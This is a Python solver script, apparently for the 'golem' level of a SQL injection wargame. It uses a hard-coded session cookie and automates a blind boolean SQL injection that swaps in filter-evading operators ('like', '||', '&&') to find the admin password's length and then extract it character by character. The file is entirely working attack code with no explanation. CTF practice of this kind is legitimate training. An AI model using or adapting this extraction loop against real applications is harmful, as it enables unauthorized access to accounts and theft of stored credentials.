import requests
from string import ascii_letters,digits

url = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php"
cookie = {"PHPSESSID":"kmm0nu5s9l1876aomjd8klu7nf"}
def GET(params, msg = "Hello admin"):
    if requests.get(url, params, cookies = cookie).text.find(msg) > 0:
        return True
    else:
        return False
length = 0
while True:
    if GET({"pw":f"'||id like 'admin'&&length(pw) like {length}#"}):
        break
    else: length += 1
pw = ""
for i in range(1, length + 1):
    for j in ascii_letters + digits:
        if GET({"pw":f"'||id like 'admin'&&mid(pw,1,{i}) like '{pw}{j}%'#"}):
            pw += j
            break
if GET({"pw":pw},"Clear!"): print("[*] Success")
